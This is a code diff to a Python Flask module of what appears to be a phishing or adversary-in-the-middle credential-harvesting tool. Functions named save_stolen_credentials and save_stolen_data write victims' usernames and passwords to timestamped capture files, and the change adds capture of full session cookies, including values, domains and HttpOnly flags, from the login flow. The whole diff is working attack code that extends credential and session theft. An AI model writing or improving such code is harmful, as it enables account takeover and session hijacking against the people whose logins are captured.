@@ -1,6 +1,7 @@
 from pathlib import Path
 from re import sub
 from datetime import datetime, timezone
+from json import dumps
 from flask import current_app
 from ..flow import LoginFlow
 
@@ -17,12 +18,15 @@ def save_stolen_credentials(username: str, password: str) -> None:
     try:
         make_captures_dir()
 
+        utc_now = datetime.now(timezone.utc)
+        utc_now_formatted = utc_now.strftime('%Y%m%dT%H%M%S')
+
         safe_username = sub(r"[^a-zA-Z0-9._-]", "_", username)
 
-        file_name = f"{safe_username}_credentials.txt"
+        file_name = f"{utc_now_formatted}-{safe_username}_credentials.txt"
         file = get_captures_dir() / file_name
         content = (
-            f"Data acquired at: {datetime.now(timezone.utc)} (UTC)\n"
+            f"Data acquired at: {utc_now} (UTC)\n"
             f"Username: {username}\n"
             f"Password: {password}\n"
         )
@@ -39,14 +43,34 @@ def save_stolen_data(login_flow: LoginFlow) -> None:
     try:
         make_captures_dir()
 
-        safe_username = sub(r"[^a-zA-Z0-9._-]", "_", login_flow.username or "unknown")
+        utc_now = datetime.now(timezone.utc)
+        utc_now_formatted = utc_now.strftime('%Y%m%dT%H%M%S')
 
-        file_name = f"{safe_username}_data.txt"
+        username = login_flow.username or ""
+        safe_username = sub(r"[^a-zA-Z0-9._-]", "_", username)
+
+        password = login_flow.password or ""
+
+        cookies = [
+            {
+                "name": cookie.name,
+                "value": cookie.value,
+                "domain": cookie.domain,
+                "path": cookie.path,
+                "secure": cookie.secure,
+                "expires": cookie.expires,
+                "http_only": cookie.has_nonstandard_attr("HttpOnly")
+            }
+            for cookie in login_flow.session.cookies
+        ]
+
+        file_name = f"{utc_now_formatted}-{safe_username}_data.txt"
         file = get_captures_dir() / file_name
         content = (
-            f"Data acquired at: {datetime.now(timezone.utc)} (UTC)\n"
-            f"Username: {login_flow.username}\n"
-            f"Password: {login_flow.password}\n"
+            f"Data acquired at: {utc_now} (UTC)\n"
+            f"Username: {username}\n"
+            f"Password: {password}\n"
+            f"Cookies: {dumps(cookies, indent=4)}\n"
         )
 
         file.write_text(content, encoding="utf-8")
